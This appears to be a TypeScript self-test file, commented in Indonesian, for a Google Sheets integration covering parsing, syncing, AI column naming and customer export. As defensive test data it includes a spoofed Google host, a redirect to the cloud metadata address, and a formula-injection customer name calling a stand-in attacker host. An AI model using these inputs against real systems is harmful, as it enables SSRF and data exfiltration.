import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { prisma } from "@palwise/db";
import { env } from "../env.js";
import {
  GalatSheet,
  ambilIsiSheet,
  lupakanKunciRobot,
  uraiAlamatSheet,
  uraiCsv,
} from "../integrasi/sheets.js";
import {
  MAKS_HURUF_CATATAN_SHEET,
  rapikanJudul,
  rapikanTabel,
  susunCatatan,
  tebakStruktur,
  terimaJawabanAi,
} from "../integrasi/strukturSheet.js";

/** Jalur tanpa AI: tebakan kode saja. */
function barisKeCatatan(t: string[][]) {
  const r = rapikanTabel(t);
  return susunCatatan(r, tebakStruktur(r));
}
import {
  barisPelanggan,
  pasangSambunganPelanggan,
  runSheetTick,
  salinPelangganKeSheet,
  sinkronSumberSheet,
  tambahSumberSheet,
} from "../integrasi/sinkronSheet.js";
import { indexSource } from "../ai/rag.js";

/**
 * Uji sambungan Google Sheet, dipanggil dari selftest.
 *
 * Semua panggilan ke Google ditiru lewat fetch, jadi jalan tanpa internet dan
 * tanpa akun Google. Yang diuji justru bagian yang TIDAK kelihatan kalau
 * cuma dicoba sekali di browser: Sheet yang gagal dibuka tidak boleh
 * mengosongkan catatan, halaman login Google tidak boleh dihafal sebagai
 * daftar harga, rumus dari nama pelanggan tidak boleh jalan, dan stok yang
 * berubah satu baris tidak boleh membayar embedding seluruh katalog.
 */

type Cek = (nama: string, syarat: boolean, rinci?: string) => void;

const ID_SHEET = "1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789abcd";
const ID_TULIS = "1ZyXwVuTsRqPoNmLkJiHgFeDcBa9876543210zyxw";

interface Panggilan {
  url: string;
  method: string;
  body: any;
}

export async function ujiSheet(check: Cek, akar: string): Promise<void> {
  console.log("\nGoogle Sheet");

  // ─── Alamat ────────────────────────────────────────────────────────────────
  const a1 = uraiAlamatSheet(`https://docs.google.com/spreadsheets/d/${ID_SHEET}/edit?usp=sharing#gid=987`);
  check("tautan Sheet biasa terbaca beserta tabnya", a1?.jenis === "biasa" && a1.id === ID_SHEET && a1.gid === "987");
  const a2 = uraiAlamatSheet(`https://docs.google.com/spreadsheets/d/${ID_SHEET}/edit`);
  check("tanpa gid berarti tab pertama", a2?.gid === null);
  const a3 = uraiAlamatSheet("https://docs.google.com/spreadsheets/d/e/2PACX-1vQabcdefghijklmnopqrstuvwxyz/pubhtml?gid=5");
  check("tautan Publikasikan ke web ikut diterima", a3?.jenis === "terbit" && a3.gid === "5");
  check(
    "alamat yang bukan docs.google.com ditolak, termasuk yang menyamar",
    uraiAlamatSheet(`https://docs.google.com.jahat.id/spreadsheets/d/${ID_SHEET}/edit`) === null &&
      uraiAlamatSheet(`https://127.0.0.1/spreadsheets/d/${ID_SHEET}/edit`) === null &&
      uraiAlamatSheet("bukan tautan") === null &&
      uraiAlamatSheet("https://docs.google.com/document/d/abcdefghijklmnopqrstuvwxyz/edit") === null,
  );

  // ─── CSV ───────────────────────────────────────────────────────────────────
  const csv = uraiCsv('﻿Nama,Harga,Keterangan\r\n"Kopi, Arabika",85000,"baris satu\nbaris dua"\r\nTeh,"12.000","kata ""enak"""\n');
  check(
    "CSV: koma dan pindah baris di dalam kutip tidak membelah barang",
    csv.length === 3 && csv[1][0] === "Kopi, Arabika" && csv[1][2] === "baris satu\nbaris dua",
    JSON.stringify(csv),
  );
  check("CSV: kutip ganda di dalam sel utuh", csv[2][2] === 'kata "enak"');
  check("CSV: tanda BOM Excel dibuang dari judul kolom", csv[0][0] === "Nama");

  // ─── Baris jadi catatan ───────────────────────────────────────────────────
  const catatan = barisKeCatatan([
    ["Nama", "Stok", "", "Harga"],
    ["Cushion 01", "12", "promo", "Rp 85.000"],
    ["", "", "", ""],
    ["Cushion 02", "0", "", "Rp 85.000"],
  ]);
  const barisCatatan = catatan.teks.split("\n");
  check(
    "satu baris satu barang, nama kolom ikut di tiap baris",
    barisCatatan.length === 2 &&
      barisCatatan[0] === "Nama: Cushion 01 | Stok: 12 | Kolom C: promo | Harga: Rp 85.000",
    catatan.teks,
  );
  check("sel kosong tidak ditulis, stok 0 tetap ditulis", barisCatatan[1] === "Nama: Cushion 02 | Stok: 0 | Harga: Rp 85.000");
  check("baris kosong tidak dihitung", catatan.jumlahBaris === 2 && catatan.terbaca === 2);

  const besar: string[][] = [["Nama", "Keterangan"]];
  for (let i = 0; i < 3000; i++) besar.push([`Barang ${i}`, "x".repeat(100)]);
  const potong = barisKeCatatan(besar);
  check(
    "Sheet kepanjangan dipotong di batas baris dan jumlahnya dilaporkan",
    potong.teks.length <= MAKS_HURUF_CATATAN_SHEET &&
      potong.terbaca < potong.jumlahBaris &&
      potong.jumlahBaris === 3000 &&
      potong.teks.split("\n").every((b) => /^Nama: Barang \d+ \| Keterangan: x{100}$/.test(b)),
  );

  // ─── Sheet berantakan ─────────────────────────────────────────────────────
  // Bentuk yang sungguhan: judul toko di atas, catatan, baris kosong, judul
  // kolom di baris 4, nomor urut, nama bagian, kolom modal, kotak centang,
  // dan judul kolom yang terulang di tengah karena dua tabel ditempel.
  const berantakan = [
    ["DAFTAR HARGA TOKO BERKAH APRIL 2026", "", "", "", "", "", ""],
    ["Harga belum termasuk ongkir", "", "", "", "", "", ""],
    ["", "", "", "", "", "", ""],
    ["No", "Nama Barang", "Hrg", "Qty", "Modal", "Ket", ""],
    ["MAKANAN", "", "", "", "", "", ""],
    ["1", "Keripik", "15rb", "20", "9000", "", ""],
    ["2", "Basreng", "12rb", "0", "7000", "PO", ""],
    ["MINUMAN", "", "", "", "", "", ""],
    ["3", "Es Teh", "5000", "TRUE", "2000", "", ""],
    ["No", "Nama Barang", "Hrg", "Qty", "Modal", "Ket", ""],
    ["4", "Kopi", "8000", "10", "3000", "", ""],
  ];
  const tb = tebakStruktur(rapikanTabel(berantakan));
  const hb = barisKeCatatan(berantakan);
  const bb = hb.teks.split("\n");
  check("judul kolom di baris ke-4 dikenali, bukan baris pertama", tb.barisJudul === 3, String(tb.barisJudul));
  check(
    "judul toko dan catatan di atas tabel ikut sebagai keterangan, bukan jadi nama kolom",
    bb[0] === "DAFTAR HARGA TOKO BERKAH APRIL 2026" &&
      bb[1] === "Harga belum termasuk ongkir" &&
      !hb.teks.includes("DAFTAR HARGA TOKO BERKAH APRIL 2026:"),
  );
  check(
    "kolom harga MODAL tidak pernah masuk catatan",
    !hb.teks.includes("Modal") && !hb.teks.includes("9000") && !hb.teks.includes("7000"),
    hb.teks,
  );
  check("kolom nomor urut dilewati", !/\bNo: /.test(hb.teks));
  check(
    "nama bagian jadi kategori barang di bawahnya",
    bb.includes("Kategori: MAKANAN | Nama Barang: Keripik | Hrg: 15rb | Qty: 20") &&
      bb.includes("Kategori: MAKANAN | Nama Barang: Basreng | Hrg: 12rb | Qty: 0 | Ket: PO"),
    hb.teks,
  );
  check("kotak centang TRUE ditulis Ya", bb.includes("Kategori: MINUMAN | Nama Barang: Es Teh | Hrg: 5000 | Qty: Ya"));
  check(
    "judul kolom yang terulang di tengah tidak dicatat sebagai barang",
    !bb.some((b) => b.includes("Nama Barang: Nama Barang")),
  );
  check("baris data dihitung benar", hb.jumlahBaris === 4 && hb.terbaca === 4, String(hb.jumlahBaris));

  const gabung = barisKeCatatan([
    ["Merek", "Produk", "Harga"],
    ["Wardah", "Lip A", "50000"],
    ["", "Lip B", "52000"],
    ["", "Lip C", "55000"],
    ["Emina", "Bedak", "30000"],
    ["", "Cushion", "45000"],
  ]).teks.split("\n");
  check(
    "sel yang digabung (merge) diisi turun, jadi tiap barang tetap tahu mereknya",
    gabung.includes("Merek: Wardah | Produk: Lip C | Harga: 55000") &&
      gabung.includes("Merek: Emina | Produk: Cushion | Harga: 45000"),
    gabung.join(" / "),
  );

  const kunci = barisKeCatatan([
    ["Jam buka", "Senin sampai Sabtu jam 9 pagi sampai 5 sore, Minggu libur"],
    ["Alamat", "Jl. Contoh No. 1, Majalengka, dekat alun-alun"],
    ["Pembayaran", "Transfer BCA, QRIS, atau bayar di tempat"],
  ]).teks.split("\n");
  check(
    "dua kolom hal dan keterangan dibaca sebagai daftar, bukan tabel dengan judul palsu",
    kunci[0] === "Jam buka: Senin sampai Sabtu jam 9 pagi sampai 5 sore, Minggu libur" && kunci.length === 3,
    kunci.join(" / "),
  );
  const duaKolom = tebakStruktur(
    rapikanTabel([
      ["Nama", "Keterangan"],
      ["Kopi", "Kopi arabika dari Gayo, sangrai sedang"],
      ["Teh", "Teh melati tubruk, wangi dan ringan"],
    ]),
  );
  check("tapi Nama | Keterangan di baris pertama tetap tabel", duaKolom.jenis === "tabel" && duaKolom.barisJudul === 0);

  const satuKolom = barisKeCatatan([["Kami buka tiap hari."], [""], ["Pengiriman lewat JNE dan J&T."]]);
  check("satu kolom tulisan dibaca apa adanya", satuKolom.teks === "Kami buka tiap hari.\nPengiriman lewat JNE dan J&T.");

  const kolomKosong = rapikanTabel([["Nama", "", "Harga", "", ""], ["Kopi", "", "85000", "", ""]]);
  check("kolom yang kosong di semua baris dibuang", kolomKosong[0].length === 2);

  check(
    "judul catatan: nama tab bawaan dibuang, Sheet tanpa judul memakai judul di atas tabel",
    rapikanJudul("Stok Toko - Sheet1", []) === "Stok Toko" &&
      rapikanJudul("Spreadsheet tanpa judul - Sheet1", ["DAFTAR HARGA APRIL"]) === "DAFTAR HARGA APRIL",
  );

  // Jawaban AI: diterima kalau masuk akal, disaring kalau berbahaya.
  const tanpaJudul = rapikanTabel([
    ["Keripik", "15000", "20", "9000"],
    ["Basreng", "12000", "0", "7000"],
  ]);
  const tebakTanpaJudul = tebakStruktur(tanpaJudul);
  check("Sheet tanpa judul kolom dikenali sebagai ragu", tebakTanpaJudul.yakin < 0.75);
  const dariAi = terimaJawabanAi(
    { jenis: "tabel", barisJudul: -1, namaKolom: ["Nama", "Harga", "Stok", "Harga modal"], rahasia: [], abaikan: [], kelompok: [] },
    tanpaJudul,
    tebakTanpaJudul,
  );
  const hasilAi = dariAi ? susunCatatan(tanpaJudul, dariAi).teks : "";
  check(
    "AI menamai kolom yang tidak berjudul, isinya tetap disalin kode apa adanya",
    hasilAi.startsWith("Nama: Keripik | Harga: 15000 | Stok: 20"),
    hasilAi,
  );
  check(
    "kolom yang AI namai harga modal tetap disembunyikan walau AI lupa menandainya",
    !hasilAi.includes("9000") && !hasilAi.includes("7000"),
    hasilAi,
  );
  const judulHarga = rapikanTabel([
    ["Nama", "Harga", "Stok"],
    ["Kopi", "85000", "3"],
  ]);
  const aiSalah = terimaJawabanAi(
    { jenis: "tabel", barisJudul: 0, namaKolom: ["Nama", "Harga", "Stok"], rahasia: [1], abaikan: [], kelompok: [] },
    judulHarga,
    tebakStruktur(judulHarga),
  );
  check("AI yang salah menyembunyikan kolom Harga jual ditolak", !!aiSalah && !aiSalah.rahasia.includes(1));
  check(
    "jawaban AI yang tidak masuk akal ditolak, tebakan kode yang dipakai",
    terimaJawabanAi({ jenis: "grafik" }, judulHarga, tebakStruktur(judulHarga)) === null &&
      terimaJawabanAi({ jenis: "tabel", barisJudul: 99 }, judulHarga, tebakStruktur(judulHarga)) === null,
  );

  // ─── Tiruan Google ─────────────────────────────────────────────────────────
  const fetchSebelum = globalThis.fetch;
  const panggilan: Panggilan[] = [];
  const teksDiEmbed: string[] = [];
  let csvSheet = "Nama,Stok,Harga\nKopi Arabika,10,85000\nKopi Robusta,5,55000\n";
  /** biasa | login | html | jahat | 404 */
  let modePublik = "biasa";
  let modeApi: "ok" | "tolak" = "ok";
  let tabTulis: string[] = [];
  /** Jawaban tiruan model untuk pembacaan bentuk Sheet. "{}" = tidak masuk akal. */
  let aiJawab = "{}";
  let aiDipanggil = 0;

  const jawab = (data: unknown, status = 200, kepala: Record<string, string> = {}) =>
    new Response(typeof data === "string" ? data : JSON.stringify(data), {
      status,
      headers: { "content-type": "application/json", ...kepala },
    });

  globalThis.fetch = (async (input: any, init: any) => {
    const url = String(input);
    const method = init?.method ?? "GET";
    let body: any = undefined;
    try {
      body = init?.body && typeof init.body === "string" && init.body.startsWith("{") ? JSON.parse(init.body) : init?.body;
    } catch {
      body = init?.body;
    }
    panggilan.push({ url, method, body });

    if (url.includes("batchEmbedContents")) {
      const reqs = body.requests as any[];
      for (const r of reqs) teksDiEmbed.push(r.content.parts[0].text);
      return jawab({
        embeddings: reqs.map((r: any) => {
          const v = new Array(768).fill(0);
          for (const k of String(r.content.parts[0].text).toLowerCase().match(/[a-z0-9]+/g) ?? []) {
            let h = 0;
            for (let i = 0; i < k.length; i++) h = (h * 31 + k.charCodeAt(i)) >>> 0;
            v[h % 768] += 1;
          }
          return { values: v };
        }),
      });
    }

    if (url.includes("generateContent")) {
      aiDipanggil++;
      return jawab({ candidates: [{ content: { parts: [{ text: aiJawab }] } }] });
    }

    if (url.startsWith("https://docs.google.com/spreadsheets/d/") && url.includes("/export?")) {
      if (modePublik === "login") {
        return new Response("", { status: 302, headers: { location: "https://accounts.google.com/ServiceLogin?continue=x" } });
      }
      if (modePublik === "jahat") {
        return new Response("", { status: 302, headers: { location: "http://169.254.169.254/latest/meta-data" } });
      }
      if (modePublik === "html") {
        return new Response("<html>masuk dulu</html>", { status: 200, headers: { "content-type": "text/html; charset=utf-8" } });
      }
      if (modePublik === "404") return new Response("", { status: 404 });
      return new Response("", {
        status: 307,
        headers: { location: "https://doc-0s-sheets.googleusercontent.com/export/abc?format=csv" },
      });
    }
    if (url.startsWith("https://doc-0s-sheets.googleusercontent.com/")) {
      return new Response(csvSheet, {
        status: 200,
        headers: {
          "content-type": "text/csv",
          "content-disposition": `attachment; filename="Stok Toko - Sheet1.csv"; filename*=UTF-8''Stok%20Toko%20-%20Sheet1.csv`,
        },
      });
    }

    if (url === "https://oauth2.googleapis.com/token") {
      return jawab({ access_token: "token-uji", expires_in: 3600 });
    }
    if (url.startsWith("https://sheets.googleapis.com/")) {
      if (modeApi === "tolak") return jawab({ error: { code: 403 } }, 403);
      if (url.includes(":batchUpdate")) {
        tabTulis = ["Sheet1", "Pelanggan Palwise"];
        return jawab({});
      }
      if (url.includes(":clear")) return jawab({});
      if (url.includes(":append")) return jawab({ updates: {} });
      if (url.includes("fields=")) {
        return jawab({ sheets: tabTulis.map((t) => ({ properties: { title: t } })) });
      }
      return jawab({});
    }
    return fetchSebelum(input, init);
  }) as typeof fetch;

  // Robot SENGAJA kosong dulu: jalur tanpa pemasangan apa pun harus jalan.
  const jsonSebelum = env.GOOGLE_SERVICE_ACCOUNT_JSON;
  const berkasSebelum = env.GOOGLE_SERVICE_ACCOUNT_FILE;
  env.GOOGLE_SERVICE_ACCOUNT_JSON = "";
  env.GOOGLE_SERVICE_ACCOUNT_FILE = "";
  lupakanKunciRobot();

  const ws = await prisma.workspace.create({ data: { name: "Uji Sheet", plan: "starter" } });
  try {
    const agent = await prisma.agent.create({ data: { name: "Asisten Sheet", workspaceId: ws.id } });
    const alamat = `https://docs.google.com/spreadsheets/d/${ID_SHEET}/edit#gid=0`;

    // Pembacaan publik ---------------------------------------------------------
    const isi = await ambilIsiSheet(alamat);
    check("Sheet berlink terbaca lewat pengalihan ke googleusercontent", isi.baris.length === 3);
    check("judul diambil dari nama berkasnya", isi.judul === "Stok Toko - Sheet1", String(isi.judul));

    const galatDari = async (mode: string) => {
      modePublik = mode;
      try {
        await ambilIsiSheet(alamat);
        return null;
      } catch (err) {
        return err;
      } finally {
        modePublik = "biasa";
      }
    };
    const gLogin = await galatDari("login");
    check(
      "Sheet pribadi (dialihkan ke halaman masuk) ditolak dengan petunjuk Bagikan",
      gLogin instanceof GalatSheet && /Bagikan/.test(gLogin.message) && /Siapa saja yang memiliki link/.test(gLogin.message),
    );
    const gHtml = await galatDari("html");
    check("halaman HTML berstatus 200 TIDAK dianggap isi Sheet", gHtml instanceof GalatSheet);
    const gJahat = await galatDari("jahat");
    check(
      "pengalihan ke alamat selain Google ditolak, tidak diikuti",
      gJahat instanceof GalatSheet && !panggilan.some((p) => p.url.includes("169.254.169.254")),
    );

    // Tambah sebagai Info bisnis ------------------------------------------------
    teksDiEmbed.length = 0;
    const tambah = await tambahSumberSheet({ agentId: agent.id, url: alamat });
    const src = await prisma.knowledgeSource.findUniqueOrThrow({ where: { id: tambah.sourceId } });
    check(
      "Sheet tersambung jadi catatan bertipe sheet yang sudah dihafal",
      src.type === "sheet" && src.status === "ready" && src.chunkCount > 0 && tambah.dihafal,
      `${src.type} ${src.status} ${src.chunkCount}`,
    );
    check("isi catatan membawa nama kolom", src.content.includes("Nama: Kopi Arabika | Stok: 10 | Harga: 85000"));
    check(
      "judulnya nama Sheet kalau orangnya tidak mengisi, tanpa nama tab bawaan",
      src.title === "Stok Toko",
      src.title,
    );

    // Tautan yang sama dengan buntut berbeda, bentuk yang biasa ditempel dari
    // tombol Bagikan. Tanpa gid SENGAJA tidak dianggap sama dengan gid=0: tab
    // pertama tidak selalu bernomor 0.
    const kembar = await tambahSumberSheet({
      agentId: agent.id,
      url: `https://docs.google.com/spreadsheets/d/${ID_SHEET}/edit?usp=sharing#gid=0`,
    });
    check(
      "Sheet yang sama tidak tersambung dua kali",
      kembar.sudahAda && (await prisma.knowledgeSource.count({ where: { agentId: agent.id, type: "sheet" } })) === 1,
    );

    const jumlahSebelum = await prisma.knowledgeSource.count({ where: { agentId: agent.id } });
    modePublik = "login";
    let gagalTambah = false;
    try {
      await tambahSumberSheet({ agentId: agent.id, url: `https://docs.google.com/spreadsheets/d/${ID_TULIS}/edit` });
    } catch {
      gagalTambah = true;
    }
    modePublik = "biasa";
    check(
      "Sheet yang belum dibagikan tidak meninggalkan catatan kosong yang memakan jatah",
      gagalTambah && (await prisma.knowledgeSource.count({ where: { agentId: agent.id } })) === jumlahSebelum,
    );

    // Sinkron: berubah, tidak berubah, gagal ------------------------------------
    teksDiEmbed.length = 0;
    const sama = await sinkronSumberSheet(src.id);
    check("isi Sheet yang tidak berubah tidak dihafal ulang", !sama.berubah && teksDiEmbed.length === 0);

    csvSheet = "Nama,Stok,Harga\nKopi Arabika,0,85000\nKopi Robusta,5,55000\n";
    const ubah = await sinkronSumberSheet(src.id);
    const src2 = await prisma.knowledgeSource.findUniqueOrThrow({ where: { id: src.id } });
    check(
      "stok yang berubah di Sheet sampai ke catatan",
      ubah.berubah && src2.content.includes("Nama: Kopi Arabika | Stok: 0") && src2.status === "ready",
    );

    modePublik = "login";
    const gagal = await sinkronSumberSheet(src.id);
    modePublik = "biasa";
    const src3 = await prisma.knowledgeSource.findUniqueOrThrow({ where: { id: src.id } });
    const potonganTetap = await prisma.knowledgeChunk.count({ where: { sourceId: src.id } });
    check(
      "Sheet yang gagal dibuka TIDAK mengosongkan catatan, asisten tetap memakai isi terakhir",
      !!gagal.galat && src3.content === src2.content && src3.status === "ready" && potonganTetap > 0,
    );
    check(
      "gagalnya dicatat supaya kelihatan, waktu berhasil terakhir tidak ikut maju",
      !!src3.sheetGagal &&
        src3.sheetDisinkron?.getTime() === src2.sheetDisinkron?.getTime() &&
        (src3.sheetDicek?.getTime() ?? 0) >= (src2.sheetDicek?.getTime() ?? 0),
    );

    csvSheet = "Nama,Stok,Harga\n";
    const kosong = await sinkronSumberSheet(src.id);
    const src4 = await prisma.knowledgeSource.findUniqueOrThrow({ where: { id: src.id } });
    check(
      "tab yang dikosongkan diperlakukan sebagai salah hapus, isi lama dipertahankan",
      !!kosong.galat && src4.content === src2.content,
    );

    csvSheet = "Nama,Stok,Harga\nKopi Arabika,0,85000\nKopi Robusta,5,55000\n";
    await sinkronSumberSheet(src.id);
    const sehat = await prisma.knowledgeSource.findUniqueOrThrow({ where: { id: src.id } });
    check("sesudah pulih, tanda gagalnya hilang sendiri", sehat.sheetGagal === null);

    // Hemat embedding: katalog besar, satu baris berubah --------------------------
    const katalog = ["Nama,Stok,Harga"];
    for (let i = 0; i < 400; i++) katalog.push(`Barang Katalog ${i},${i % 17},${10000 + i}`);
    csvSheet = katalog.join("\n");
    await sinkronSumberSheet(src.id);
    const penuh = await prisma.knowledgeSource.findUniqueOrThrow({ where: { id: src.id } });

    katalog[200] = "Barang Katalog 199,999,10199";
    csvSheet = katalog.join("\n");
    teksDiEmbed.length = 0;
    await sinkronSumberSheet(src.id);
    check(
      "satu baris stok berubah cuma membayar embedding potongan tempat baris itu berada",
      teksDiEmbed.length >= 1 && teksDiEmbed.length <= 2 && penuh.chunkCount > 10,
      `${teksDiEmbed.length} dari ${penuh.chunkCount} potongan dihitung ulang`,
    );
    teksDiEmbed.length = 0;
    await indexSource(src.id);
    check("menghafal ulang isi yang sama tidak memanggil embedder sama sekali", teksDiEmbed.length === 0);

    // Penjadwal -------------------------------------------------------------
    await prisma.knowledgeSource.update({ where: { id: src.id }, data: { sheetDicek: new Date() } });
    const csvSebelumTick = panggilan.filter((p) => p.url.includes("googleusercontent")).length;
    await runSheetTick();
    check(
      "penjadwal tidak membaca Sheet yang baru saja dibaca",
      panggilan.filter((p) => p.url.includes("googleusercontent")).length === csvSebelumTick,
    );
    await prisma.knowledgeSource.update({
      where: { id: src.id },
      data: { sheetDicek: new Date(Date.now() - 31 * 60_000) },
    });
    await runSheetTick();
    check(
      "penjadwal membaca Sheet yang sudah lewat 30 menit",
      panggilan.filter((p) => p.url.includes("googleusercontent")).length === csvSebelumTick + 1,
    );

    // Pembacaan bentuk lewat AI, sekali per bentuk ---------------------------
    const alamatTanpaJudul = `https://docs.google.com/spreadsheets/d/${ID_SHEET}/edit#gid=77`;
    csvSheet = "Keripik,15000,20,9000\nBasreng,12000,0,7000\n";
    aiJawab = JSON.stringify({
      jenis: "tabel",
      barisJudul: -1,
      namaKolom: ["Nama", "Harga", "Stok", "Harga modal"],
      rahasia: [3],
      abaikan: [],
      kelompok: [],
    });
    aiDipanggil = 0;
    const tAi = await tambahSumberSheet({ agentId: agent.id, url: alamatTanpaJudul, judul: "Tanpa judul kolom" });
    const sAi = await prisma.knowledgeSource.findUniqueOrThrow({ where: { id: tAi.sourceId } });
    check(
      "Sheet tanpa judul kolom tersambung dengan nama kolom dari AI",
      aiDipanggil === 1 &&
        sAi.content.startsWith("Nama: Keripik | Harga: 15000 | Stok: 20") &&
        !sAi.content.includes("9000"),
      sAi.content,
    );
    check(
      "penjelasan bacaannya disimpan untuk layar, termasuk kolom yang disembunyikan",
      !!sAi.sheetStruktur && String(JSON.parse(sAi.sheetStruktur).bacaan).includes("Harga modal"),
    );
    csvSheet = "Keripik,15000,3,9000\nBasreng,12000,0,7000\n";
    const dipanggilSebelum = aiDipanggil;
    await sinkronSumberSheet(sAi.id);
    const sAi2 = await prisma.knowledgeSource.findUniqueOrThrow({ where: { id: sAi.id } });
    check(
      "stok berubah tidak membuat AI ditanya ulang, bacaan bentuk lama dipakai",
      aiDipanggil === dipanggilSebelum && sAi2.content.includes("Nama: Keripik | Harga: 15000 | Stok: 3"),
      `${aiDipanggil - dipanggilSebelum} panggilan`,
    );
    aiJawab = "bukan json sama sekali";
    csvSheet = "Produk,Harga\nKeripik,15000\n";
    await sinkronSumberSheet(sAi.id);
    const sAi3 = await prisma.knowledgeSource.findUniqueOrThrow({ where: { id: sAi.id } });
    check(
      "AI yang menjawab ngawur tidak merusak apa pun, tebakan kode yang dipakai",
      sAi3.content === "Produk: Keripik | Harga: 15000" && !sAi3.sheetGagal,
      sAi3.content,
    );
    aiJawab = "{}";

    // Menyalin pelanggan ----------------------------------------------------
    let tolakTanpaRobot = false;
    try {
      await pasangSambunganPelanggan(ws.id, `https://docs.google.com/spreadsheets/d/${ID_TULIS}/edit`);
    } catch (err) {
      tolakTanpaRobot = err instanceof GalatSheet;
    }
    check(
      "tanpa robot di server, menyalin pelanggan ditolak dan tidak tersimpan setengah jadi",
      tolakTanpaRobot && (await prisma.sambunganSheet.count({ where: { workspaceId: ws.id } })) === 0,
    );

    const { privateKey } = crypto.generateKeyPairSync("rsa", { modulusLength: 2048 });
    env.GOOGLE_SERVICE_ACCOUNT_JSON = JSON.stringify({
      client_email: "palwise-uji@proyek-uji.iam.gserviceaccount.com",
      private_key: privateKey.export({ type: "pkcs8", format: "pem" }).toString().replace(/\n/g, "\\n"),
    });
    lupakanKunciRobot();

    await prisma.contact.createMany({
      data: [
        {
          workspaceId: ws.id,
          waJid: "6281200000001@s.whatsapp.net",
          phone: "6281200000001",
          name: '=IMPORTXML("http://jahat.id","//a")',
          stage: "tertarik",
          tags: JSON.stringify(["grosir", "reseller"]),
          janjiPada: new Date("2026-09-20T07:00:00Z"),
          janjiDipastikan: true,
        },
        {
          workspaceId: ws.id,
          waJid: "playground:uji-sheet",
          name: "Pelanggan pura-pura",
        },
      ],
    });

    const baris = await barisPelanggan(ws.id);
    check("ruang coba tidak ikut tersalin", baris.length === 2 && !JSON.stringify(baris).includes("pura-pura"));
    check("nomor WhatsApp ditulis sebagai teks utuh", baris[1][1] === "6281200000001");
    check("janji temu ditulis waktu setempat yang bisa diurutkan", baris[1][7] === "2026-09-20 14:00", baris[1][7]);
    check("label ditulis sebagai daftar biasa", baris[1][3] === "grosir, reseller");

    panggilan.length = 0;
    tabTulis = ["Sheet1"];
    const pasang = await pasangSambunganPelanggan(
      ws.id,
      `https://docs.google.com/spreadsheets/d/${ID_TULIS}/edit#gid=0`,
    );
    const tulis = panggilan.find((p) => p.url.includes(":append"));
    check("memasang Sheet langsung menyalin sekali", pasang.ditulis && pasang.jumlah === 1);
    check(
      "tab Pelanggan Palwise dibuat kalau belum ada, dengan baris judul dibekukan",
      panggilan.some(
        (p) =>
          p.url.includes(":batchUpdate") &&
          p.body?.requests?.[0]?.addSheet?.properties?.title === "Pelanggan Palwise" &&
          p.body.requests[0].addSheet.properties.gridProperties?.frozenRowCount === 1,
      ),
    );
    check(
      "ditulis RAW, jadi nama pelanggan berbentuk rumus tidak dijalankan Sheet",
      !!tulis && tulis.url.includes("valueInputOption=RAW") && !tulis.url.includes("USER_ENTERED"),
    );
    check(
      "isinya dikosongkan dulu, jadi pelanggan yang dihapus tidak tertinggal di Sheet",
      panggilan.findIndex((p) => p.url.includes(":clear")) < panggilan.findIndex((p) => p.url.includes(":append")),
    );
    check(
      "cuma tab Pelanggan Palwise yang disentuh",
      panggilan
        .filter((p) => p.url.includes("/values/"))
        .every((p) => decodeURIComponent(p.url).includes("'Pelanggan Palwise'")),
    );

    panggilan.length = 0;
    const lagi = await salinPelangganKeSheet(ws.id);
    check(
      "isi yang tidak berubah tidak ditulis ulang",
      !lagi.ditulis && !panggilan.some((p) => p.url.startsWith("https://sheets.googleapis.com/")),
    );

    modeApi = "tolak";
    let galatSalin = "";
    try {
      await salinPelangganKeSheet(ws.id, { paksa: true });
    } catch (err) {
      galatSalin = err instanceof Error ? err.message : "";
    }
    modeApi = "ok";
    const samb = await prisma.sambunganSheet.findUniqueOrThrow({ where: { workspaceId: ws.id } });
    check(
      "robot yang dicabut aksesnya: galatnya menyebut email robot dan tercatat di layar",
      galatSalin.includes("palwise-uji@proyek-uji.iam.gserviceaccount.com") && !!samb.galat,
    );

    let tolakTerbit = false;
    try {
      await pasangSambunganPelanggan(ws.id, "https://docs.google.com/spreadsheets/d/e/2PACX-1vQabcdefghijklmnopqrstuvwxyz/pubhtml");
    } catch (err) {
      tolakTerbit = err instanceof GalatSheet;
    }
    check("tautan Publikasikan ke web ditolak untuk menulis", tolakTerbit);
  } finally {
    globalThis.fetch = fetchSebelum;
    env.GOOGLE_SERVICE_ACCOUNT_JSON = jsonSebelum;
    env.GOOGLE_SERVICE_ACCOUNT_FILE = berkasSebelum;
    lupakanKunciRobot();
    await prisma.workspace.delete({ where: { id: ws.id } }).catch(() => null);
  }

  // ─── Layar dan janji ───────────────────────────────────────────────────────
  const baca = (p: string) => fs.readFileSync(path.join(akar, p), "utf8");
  const aksi = baca("apps/web/src/app/actions/knowledge.ts");
  check(
    "catatan dari Sheet ditolak disunting di server, bukan cuma dikunci di layar",
    aksi.includes('owned.type === "sheet"'),
  );
  const halaman = baca("apps/web/src/app/app/sambungan/page.tsx");
  check(
    "kartu salin pelanggan tidak digambar kalau robot belum dipasang",
    halaman.includes("{robot && ("),
  );
  check(
    "halaman privasi menyebut Google Sheets di daftar pihak ketiga",
    baca("apps/web/src/app/privasi/page.tsx").includes("<strong>Google Sheets</strong>"),
  );
  check(
    "menu Google Sheet terdaftar di definisi menu yang satu",
    baca("apps/web/src/lib/navigasi.ts").includes('href: "/app/sambungan"'),
  );
  const daftar = baca("apps/web/src/components/KnowledgeList.tsx");
  check(
    "gagal membaca Sheet tampil di kartu catatan, bukan cuma di dalam jendela",
    daftar.includes("{source.sheetGagal && ("),
  );
}
